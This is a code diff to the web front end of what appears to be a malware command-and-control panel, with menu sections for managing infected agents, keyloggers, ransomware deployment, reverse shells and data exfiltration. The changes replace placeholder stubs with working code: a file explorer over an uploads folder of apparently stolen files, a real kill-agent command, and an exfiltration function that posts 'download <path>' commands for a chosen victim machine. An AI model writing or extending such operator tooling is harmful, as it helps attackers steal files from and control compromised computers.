@@ -304,25 +304,14 @@
             color: #ff5555;
         }
 
-        /* Status Panel */
-        .status-panel {
-            display: flex;
-            gap: 20px;
-            margin-top: 20px;
-        }
-
-        .status-box {
-            background-color: #1a1a1a;
-            padding: 15px;
-            flex: 1;
-            text-align: center;
-            border: 1px solid #00ff88;
-            border-radius: 5px;
-        }
-
-        .status-box h3 {
-            margin-bottom: 10px;
-        }
+        /*static files listing*/
+        #path-nav { margin-bottom: 10px; font-weight: bold; }
+        #path-nav a { color: blue; text-decoration: none; margin-right: 5px; }
+        #path-nav a:hover { text-decoration: underline; }
+        #file-list { list-style: none; padding: 0; }
+        #file-list li { padding: 5px; }
+        .directory { color: green; cursor: pointer; }
+        .file { color: black; }
 
         /* Status Dot Styles */
         .status-dot {
@@ -627,7 +616,7 @@
                     <li onclick="showSection('agents')">Manage Agents</li>
                     <li onclick="showSection('logs')">Logs</li>
                     <li onclick="showSection('commands')">Command Multicast</li>
-                    <li onclick="showSection('status')">System Status</li>
+                    <li onclick="showSection('status')">Files</li>
                     <a href="/super-admin-panel" id="superAdminLink" style="margin-left: 11px;">Go to Super Admin
                         Dashboard</a>
                 </ul>
@@ -691,28 +680,122 @@
                     </div>
                 </div>
 
-                <!-- Status -->
-                <div id="status" style="display:none;">
-                    <h2>System Status</h2>
-                    <div class="status-panel">
-                        <div class="status-box">
-                            <h3>Total Agents</h3>
-                            <p>5</p>
-                        </div>
-                        <div class="status-box">
-                            <h3>Online Agents</h3>
-                            <p>3</p>
-                        </div>
-                        <div class="status-box">
-                            <h3>Pending Commands</h3>
-                            <p>2</p>
-                        </div>
-                        <div class="status-box">
-                            <h3>System Uptime</h3>
-                            <p>12:34:56</p>
-                        </div>
-                    </div>
+                <!-- Files -->
+                <div id="status">
+                    <h2>File Explorer</h2><br>
+                    <div id="path-nav"></div>
+                    <ul id="file-list"></ul>
+                    <script>
+                        async function loadFiles(subpath = "") {
+                            try {
+                                const response = await fetch(`/api/uploads/${subpath}`);
+                                if (!response.ok) {
+                                    throw new Error(`HTTP error! status: ${response.status}`);
+                                }
+                                const data = await response.json();
+                
+                                // Update path navigation
+                                updatePathNav(subpath);
+                
+                                // Update file list
+                                const fileList = document.getElementById("file-list");
+                                fileList.innerHTML = ""; // Clear previous contents
+                
+                                // Add directories
+                                data.dirs.forEach(dir => {
+                                    const li = document.createElement("li");
+                                    const link = document.createElement("a");
+                                    link.href = "#"; // Prevent default navigation
+                                    link.className = "directory";
+                                    link.textContent = `[${dir}]`; // Indicate it's a directory
+                                    link.onclick = (e) => {
+                                        e.preventDefault();
+                                        const newPath = subpath ? `${subpath}/${dir}` : dir;
+                                        loadFiles(newPath);
+                                        updateURL(newPath);
+                                    };
+                                    li.appendChild(link);
+                                    fileList.appendChild(li);
+                                });
+                
+                                // Add files
+                                data.files.forEach(file => {
+                                    const li = document.createElement("li");
+                                    const link = document.createElement("a");
+                                    link.href = `/download/${subpath ? subpath + '/' + file : file}`;
+                                    link.className = "file";
+                                    link.textContent = file;
+                                    link.download = file; // Forces download
+                                    li.appendChild(link);
+                                    fileList.appendChild(li);
+                                });
+                
+                                document.getElementById("status").style.display = "block";
+                            } catch (error) {
+                                console.error("Error loading files:", error);
+                                document.getElementById("status").innerHTML = `<p>Error: ${error.message}</p>`;
+                            }
+                        }
+                
+                        function updatePathNav(subpath) {
+                            const pathNav = document.getElementById("path-nav");
+                            pathNav.innerHTML = "";
+                
+                            const parts = subpath ? subpath.split("/") : [];
+                            let currentPath = "";
+                
+                            // Root link
+                            const rootLink = document.createElement("a");
+                            rootLink.href = "#";
+                            rootLink.textContent = "uploads";
+                            rootLink.onclick = (e) => {
+                                e.preventDefault();
+                                loadFiles("");
+                                updateURL("");
+                            };
+                            pathNav.appendChild(rootLink);
+                
+                            // Build breadcrumb
+                            parts.forEach((part, index) => {
+                                currentPath = currentPath ? `${currentPath}/${part}` : part;
+                                const separator = document.createTextNode(" > ");
+                                pathNav.appendChild(separator);
+                
+                                const link = document.createElement("a");
+                                link.href = "#";
+                                link.textContent = part;
+                                const pathToLoad = currentPath; // Capture current path for closure
+                                link.onclick = (e) => {
+                                    e.preventDefault();
+                                    loadFiles(pathToLoad);
+                                    updateURL(pathToLoad);
+                                };
+                                pathNav.appendChild(link);
+                            });
+                        }
+                
+                        function updateURL(subpath) {
+                            // Update the browser URL without reloading the page
+                            const newURL = subpath ? `#/${subpath}` : "/";
+                            window.history.pushState({ path: subpath }, "", newURL);
+                        }
+                
+                        // Handle browser back/forward buttons
+                        window.onpopstate = (event) => {
+                            const subpath = event.state ? event.state.path : "";
+                            loadFiles(subpath);
+                        };
+                
+                        // Initial load based on URL hash
+                        window.onload = () => {
+                            const hash = window.location.hash;
+                            const subpath = hash ? hash.substring(2) : ""; // Remove "#/"
+                            loadFiles(subpath);
+                        };
+                    </script>
                 </div>
+        
+
             </div>
         </div>
         <div id="terminal-container">
@@ -818,8 +901,9 @@
                 </div>
                 <div id="dataExfil" class="content-section">
                     <h3>Exfiltrate Data</h3>
-                    <p>Initiate data exfiltration.</p>
-                    <button onclick="simulateDataExfiltration()">Start</button>
+                    <p>Enter the file path to exfiltrate:</p>
+                    <input type="text" id="filePathInputForExfiltration" placeholder="/path/to/file">
+                    <button onclick="DataExfiltration()">Start</button>
                 </div>
                 <div id="reverseShell" class="content-section">
                     <h3>Open Reverse Shell</h3>
@@ -1250,10 +1334,15 @@
         }
 
         function killAgent() {
-            if (confirm(`Are you sure you want to kill agent ${currentClientId}?`)) {
-                alert(`Agent ${currentClientId} has been terminated`);
-                logAction(`Killed agent ${currentClientId}`);
-            }
+            if (confirm(`Are you sure you want to kill agent ${currentClientId}?`))
+                fetch('/input-command-to-execute-from-web', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientid: currentClientId, command: "kill_agent" })
+                })
+
+            alert(`Agent is successfully killed of client id: ${currentClientId}`);
+            logAction(`Agent killed ${currentClientId}`);
         }
 
         function startKeylogger() {
@@ -1281,9 +1370,32 @@
             logAction(`Deployed ransomware on ${currentClientId}`);
         }
 
-        function simulateDataExfiltration() {
-            alert(`Data exfiltration initiated from agent ${currentClientId}`);
-            logAction(`Initiated data exfiltration from ${currentClientId}`);
+        function DataExfiltration() {
+
+            alert(`Data exfiltration command set from agent ${currentClientId}`);
+            logAction(`Data exfiltration command set from ${currentClientId}`);
+            const filePath = document.getElementById("filePathInputForExfiltration").value;
+            if (!filePath) {
+                alert("Please enter a file path.");
+                return;
+            }
+
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: `download ${filePath}` })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    logAction(`Command sent to download "${filePath}" for client "${currentClientId}".`);
+                    if (data.status) {
+                        alert(data.status);
+                    }
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
         }
 
         function simulateReverseShell() {
